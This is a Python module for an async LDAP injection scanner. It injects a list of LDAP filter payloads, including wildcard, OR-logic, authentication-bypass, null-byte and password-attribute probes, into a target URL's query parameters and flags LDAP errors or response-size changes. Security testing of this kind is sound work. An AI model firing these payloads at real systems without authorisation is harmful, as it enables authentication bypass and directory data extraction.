import aiohttp
import asyncio
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# LDAP Injection Payloads
# Focus on Filter Bypass and Attribute Extraction
LDAP_PAYLOADS = [
    # 1. Basic Filter Bypass (Star)
    {"value": "*", "desc": "LDAP Wildcard (*)"},
    
    # 2. Logic Injection (OR)
    {"value": ")(objectClass=*)", "desc": "LDAP Injection (OR objectClass=*)"},
    {"value": ")(cn=*)", "desc": "LDAP Injection (OR cn=*)"},
    
    # 3. Authentication Bypass
    {"value": "*)(uid=*))(|(uid=*", "desc": "LDAP Auth Bypass (Star)"},
    {"value": "!)", "desc": "LDAP Null Byte/Comment"},
    
    # 4. Blind Extraction (Attributes)
    {"value": "*)(|(objectpassword=*)", "desc": "LDAP Attribute Scanning"},

    # 5. Advanced Injection
    {"value": ")(cn=admin))(|(uid=*", "desc": "LDAP Admin Injection (Force Logic)"},
    {"value": "*))%00", "desc": "LDAP Null Byte Bypass"},
    {"value": "admin*)((|userpassword=*)", "desc": "LDAP Admin & Password Probe"}
]

async def check_ldap_injection(session, url, log_callback=None):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params: return findings
    
    # Baseline Request
    try:
         async with session.get(url, timeout=5, ssl=False) as base_resp:
            base_text = await base_resp.text()
            base_status = base_resp.status
    except: return []

    for param_name in params:
        original_value = params[param_name][0]
        
        for item in LDAP_PAYLOADS:
            # We inject the payload directly
            malicious_val = f"{original_value}{item['value']}"
            new_params = params.copy()
            new_params[param_name] = [malicious_val]
            target_url = urlunparse(parsed._replace(query=urlencode(new_params, doseq=True)))
            
            try:
                async with session.get(target_url, timeout=5, ssl=False) as resp:
                    text = await resp.text()
                    
                    # 1. Error Based Detection
                    ldap_errors = [
                        "LDAPException", "com.sun.jndi.ldap", "javax.naming.NameNotFoundException",
                        "IPWorksASP.LDAP", "Protocol error occurred", "Size limit has exceeded"
                    ]
                    
                    found_error = next((err for err in ldap_errors if err in text), None)
                    if found_error:
                         findings.append({
                            "type": "LDAP Injection (Error Based)",
                            "severity": "High",
                            "detail": f"LDAP error triggered: {found_error}",
                            "evidence": f"Payload: {item['desc']}\nTarget: {target_url}",
                            "category": "Injection"
                        })
                         continue

                    # 2. Boolean/Behavioral Differences
                    # Significant content change (suggesting filter change)
                    # BUT we must be careful of generic 404s/Invalid inputs
                    
                    # If wildcard (*) returns MORE data or Different successful page than original
                    if item['value'] == "*" and len(text) > len(base_text) * 1.5 and resp.status == 200:
                         findings.append({
                            "type": "Potential LDAP Injection",
                            "severity": "Medium",
                            "detail": "Wildcard injection returned significantly more data.",
                            "evidence": f"Payload: *\nData Size: {len(text)} vs {len(base_text)}",
                            "category": "Injection"
                        })
                        
            except: pass
            
    return findings

async def run_ldap_scan(target_url, log_callback=None, headers=None):
    findings = []
    if "?" not in target_url: return []
    
    if log_callback: log_callback(f"🌳 Testing LDAP Injection...")
    
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            findings = await check_ldap_injection(session, target_url, log_callback)
    except Exception as e:
        if log_callback: log_callback(f"[-] LDAP Scan Error: {e}")
        
    return findings
